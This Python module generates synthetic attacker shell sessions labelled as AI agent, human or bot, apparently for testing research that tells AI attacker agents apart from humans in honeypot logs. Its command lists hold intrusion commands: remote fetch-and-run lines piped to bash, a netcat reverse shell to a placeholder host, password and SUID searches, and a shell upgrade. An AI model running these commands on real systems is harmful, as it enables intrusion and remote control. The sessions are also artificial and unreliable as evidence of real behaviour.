"""Synthetic session generator — for smoke-testing the pipeline before the
real Zenodo download and before human data is collected.

It encodes the *priors* from the literature (EXPERIMENT.md §4): agents are
fast, emit complete flag-rich commands, follow a tidy recon→enum→action
order, and quote prior output; humans are slower with heavy-tailed pauses,
abbreviate, make typos and retries. These are PLAUSIBILITY STUBS, not real
data — any result on synthetic data proves only that the code runs and that
the features carry the intended signal, never that the phenomenon is real.
"""
from __future__ import annotations

import random
from .ingest import Session, Command

_RECON = ["whoami", "id", "uname -a", "hostname", "pwd", "ls -la", "cat /etc/passwd", "env"]
_ENUM = ["find / -perm -4000 -type f 2>/dev/null", "grep -r password /etc 2>/dev/null",
         "sudo -l", "crontab -l", "dpkg -l", "which python3"]
_ACTION = ["wget http://x/y.sh -O /tmp/y.sh", "chmod +x /tmp/y.sh", "curl -s http://x/a | bash",
           "nc -e /bin/sh 10.0.0.1 4444", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"]

_HUMAN_TYPOS = {"whoami": "whoam**", "ls -la": "ls-la", "sudo -l": "sido -l"}


def _agent_session(i, family, env, task, rng):
    cmds = []
    pool = _RECON[: rng.randint(4, 6)] + _ENUM[: rng.randint(2, 4)] + _ACTION[: rng.randint(1, 3)]
    for j, c in enumerate(pool):
        gap = None if j == 0 else rng.gauss(900, 180)   # tight, ~0.9 s
        out = "root:x:0:0" if "passwd" in c else ("uid=0(root)" if c in ("id", "whoami") else "ok")
        # occasionally quote previous output
        if j > 0 and rng.random() < 0.3:
            c = c + " # root"
        cmds.append(Command(text=c, gap_ms=max(gap or 0, 50), output=out, exec_ms=rng.gauss(40, 10)))
    return Session(f"synth_agent_{i}", "agent", "synthetic", cmds,
                   model=f"{family}-x", model_family=family, environment=env, task=task)


def _human_session(i, env, task, rng):
    cmds = []
    pool = _RECON[: rng.randint(3, 5)] + _ENUM[: rng.randint(1, 3)] + _ACTION[: rng.randint(0, 2)]
    rng.shuffle(pool) if rng.random() < 0.3 else None   # humans less tidy
    for j, c in enumerate(pool):
        # heavy-tailed think time: mostly a few seconds, occasional long pause
        gap = None if j == 0 else (rng.lognormvariate(1.1, 1.0) * 1000)
        edits = 0
        if rng.random() < 0.25:            # typo then retry
            typo = _HUMAN_TYPOS.get(c)
            if typo:
                cmds.append(Command(text=typo, gap_ms=max(gap or 0, 200),
                                    output="command not found"))
                cmds[-1].__dict__["_edits"] = rng.randint(1, 4)
                gap = rng.lognormvariate(0.3, 0.5) * 1000
                edits = rng.randint(1, 5)
        c2 = c.replace(" 2>/dev/null", "") if rng.random() < 0.6 else c  # humans omit noise redir
        out = "root:x:0:0" if "passwd" in c2 else "ok"
        cm = Command(text=c2, gap_ms=max(gap or 0, 200), output=out)
        cm.__dict__["_edits"] = edits
        cmds.append(cm)
    return Session(f"synth_human_{i}", "human", "synthetic", cmds,
                   model="human", model_family="human", environment=env, task=task)


def _bot_session(i, env, task, rng):
    pool = ["enable", "system", "shell", "sh", "cat /proc/mounts", "busybox",
            "wget http://x/m -O -; chmod +x m; ./m"]
    cmds = []
    for j, c in enumerate(pool):
        gap = None if j == 0 else rng.gauss(120, 8)   # machine-regular
        cmds.append(Command(text=c, gap_ms=max(gap or 0, 20), output="ok"))
    return Session(f"synth_bot_{i}", "bot", "synthetic", cmds,
                   model="bot", model_family="bot", environment=env, task=task)


def generate(n_agent=400, n_human=120, n_bot=80, seed=0, families=("openai", "anthropic", "meta", "qwen"),
             envs=("real_ubuntu", "cowrie_default", "cowrie_hifi"), tasks=("prompt_1", "prompt_2", "prompt_3")):
    rng = random.Random(seed)
    out = []
    for i in range(n_agent):
        out.append(_agent_session(i, rng.choice(families), rng.choice(envs), rng.choice(tasks), rng))
    for i in range(n_human):
        out.append(_human_session(i, rng.choice(envs), rng.choice(tasks), rng))
    for i in range(n_bot):
        out.append(_bot_session(i, rng.choice(envs), rng.choice(tasks), rng))
    rng.shuffle(out)
    return out
